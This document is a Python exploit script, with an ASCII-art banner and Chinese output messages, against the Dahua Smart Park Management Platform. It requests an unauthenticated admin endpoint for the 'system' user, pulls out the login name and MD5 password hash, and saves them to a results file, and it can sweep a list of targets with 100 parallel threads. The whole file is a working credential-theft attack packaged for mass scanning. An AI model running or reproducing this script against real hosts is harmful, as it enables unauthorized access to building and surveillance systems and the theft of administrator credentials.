# 大华智慧园区管理平台任意密码读取

import argparse, sys, requests, time, os, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
            
        ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ 
        ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗
        ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║██████╔╝█████╗  ███████║██║  ██║
        ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║██╔══██╗██╔══╝  ██╔══██║██║  ██║
        ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝██║  ██║███████╗██║  ██║██████╔╝
        ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                                                    author:秋妤
                                                                                                    date:2024.09.03
                                                                                                    version:1.0

            """
    print(test)


def poc(target):
    payload = "/admin/user_getUserInfoByUserName.action?userName=system"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Accept-Encoding": "gzip,deflate,br",
        "Connection": "keep-alive"
    }
    try:
        res = requests.get(url=target + payload, headers=headers, timeout=5, verify=False)
        # print(res.text)
        result2 = re.search('"loginName":"(.*?)"', res.text, re.S)[0]
        result3 = re.search('"loginPass":"(.*?)"', res.text, re.S)[0]
        if "loginName" in res.text:
            print(f"[+] {target} 存在任意文件读取漏洞")
            with open("大华_result.txt", "a+", encoding="utf-8") as f:
                f.write(target + " 用户名：" + result2 + " 密码（md5加密）：" + result3 + "\n")
        else:
            print(f"[-] {target} 不存在任意文件读取漏洞")
    except Exception as e:
        print(e)


def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个大华智慧园区管理平台任意密码读取的漏洞扫描脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()